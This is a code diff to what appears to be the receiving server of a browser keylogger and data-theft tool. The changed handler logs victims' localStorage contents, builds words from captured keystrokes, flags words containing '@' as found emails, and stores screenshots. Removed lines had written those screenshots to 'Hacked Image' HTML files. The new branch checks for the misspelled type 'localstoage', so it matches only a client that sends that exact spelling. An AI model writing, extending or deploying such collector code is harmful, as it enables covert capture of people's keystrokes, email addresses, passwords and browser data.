@@ -56,31 +56,32 @@ https
             content: jsonBody.url,
           });
         }
+        if (jsonBody.type === "localstoage") {
+          content.push({
+            date: new Date(),
+            type: "localstorage",
+            content: jsonBody.content,
+          });
+        }
         if (jsonBody.type === "key") {
           const letter = jsonBody.key;
-          word += letter;
-          if (letter === " " || letter === "Enter" || letter === "Tab") {
-            content.push({ date: new Date(), type: "word", content: word });
-            if (word.indexOf("@") > -1) {
-              console.warn("🎺 email found: " + word + " 🎺");
+          if (letter !== "Meta" && letter !== "Shift" && letter !== "Control") {
+            word += letter;
+            if (letter === " " || letter === "Enter" || letter === "Tab") {
+              content.push({ date: new Date(), type: "word", content: word });
+              if (word.indexOf("@") > -1) {
+                console.warn("🎺 email found: " + word + " 🎺");
+              }
+              word = "";
             }
-            word = "";
           }
         }
 
         if (jsonBody.type === "image") {
-          const imageName = `${Date.now()}.html`;
-          const htmlWithImage = `<html><body><h1>Hacked Image - ${new Date().toDateString()}</h1><img src="${
-            jsonBody.content
-          }" /></body></html>`;
           content.push({
             date: new Date(),
             type: "screenshot",
             content: jsonBody.content,
-          });
-          fs.writeFile(imageName, htmlWithImage, function (err) {
-            if (err) throw err;
-            console.log("=== Image saved: ", imageName);
           });
         }
         response.end();
